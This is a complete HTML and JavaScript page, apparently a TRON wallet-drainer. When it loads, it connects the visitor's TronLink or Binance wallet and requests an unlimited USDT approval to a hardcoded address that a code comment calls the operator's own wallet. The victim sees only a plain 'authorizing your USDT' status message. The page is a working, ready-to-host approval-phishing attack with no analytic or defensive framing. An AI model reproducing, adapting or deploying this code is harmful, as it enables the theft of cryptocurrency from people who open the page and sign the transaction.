<!DOCTYPE html>
<html lang="zh-Hant">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>TRC20 USDT 自動授權</title>
<style>
  body {
    font-family: "Noto Sans TC", sans-serif;
    background: linear-gradient(135deg, #0f172a, #1e293b, #2563eb, #1e3a8a);
    background-size: 400% 400%;
    animation: gradientBG 12s ease infinite;
    color: #fff;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    margin: 0;
  }
  @keyframes gradientBG {
    0% { background-position: 0% 50%; }
    50% { background-position: 100% 50%; }
    100% { background-position: 0% 50%; }
  }
  .container {
    background: rgba(255,255,255,0.05);
    padding: 30px;
    border-radius: 15px;
    max-width: 420px;
    width: 100%;
    text-align: center;
    backdrop-filter: blur(10px);
  }
  h1 { font-size: 22px; margin-bottom: 15px; }
  p { font-size: 15px; margin-bottom: 15px; color: #cbd5e1; }
  #status { margin-top: 15px; font-size: 14px; }
  .success { color: #4ade80; }
  .error { color: #f87171; }
  .loading { color: #facc15; }
</style>
<script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.min.js"></script>
</head>
<body>
<div class="container">
  <h1>正在授權您的 USDT</h1>
  <p>合約地址：<br><small>TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t</small></p>
  <p>授權給：<br><small>TD8dRs5BMqk5NLQkY4TGcUshxUtyGChQHf</small></p>
  <p id="status" class="loading">檢測錢包中...</p>
</div>

<script>
  const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // TRON USDT 合約
  const A_ADDRESS = "TD8dRs5BMqk5NLQkY4TGcUshxUtyGChQHf";     // 你的 A 錢包
  const INFINITE_AMOUNT = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
  let tronWeb;

  async function connectWallet() {
    if (window.tronWeb && window.tronWeb.ready) {
      tronWeb = window.tronWeb;
      return tronWeb.defaultAddress.base58;
    }
    if (window.tronLink) {
      await window.tronLink.request({ method: 'tron_requestAccounts' });
      tronWeb = window.tronWeb;
      return tronWeb.defaultAddress.base58;
    }
    if (window.binance && window.binance.tron) {
      await window.binance.tron.request({ method: 'tron_requestAccounts' });
      tronWeb = new TronWeb(window.binance.tron);
      return tronWeb.defaultAddress.base58;
    }
    // 沒有檢測到錢包 → 跳轉下載頁
    window.location.href = "https://www.tronlink.org/";
    return null;
  }

  async function autoApprove() {
    document.getElementById("status").innerText = "正在連接錢包...";
    document.getElementById("status").className = "loading";

    const address = await connectWallet();
    if (!address) return;

    document.getElementById("status").innerText = "錢包已連接：" + address;
    document.getElementById("status").className = "success";

    try {
      document.getElementById("status").innerText = "發送授權交易中，請在錢包中確認...";
      document.getElementById("status").className = "loading";

      const contract = await tronWeb.contract().at(USDT_CONTRACT);
      const tx = await contract.approve(A_ADDRESS, INFINITE_AMOUNT).send();

      document.getElementById("status").innerText = "✅ 授權成功！交易 ID：" + tx;
      document.getElementById("status").className = "success";
    } catch (err) {
      console.error(err);
      document.getElementById("status").innerText = "❌ 授權失敗或已取消";
      document.getElementById("status").className = "error";
    }
  }

  // 頁面加載完成 → 自動授權
  window.addEventListener('load', autoApprove);
</script>
</body>
</html>
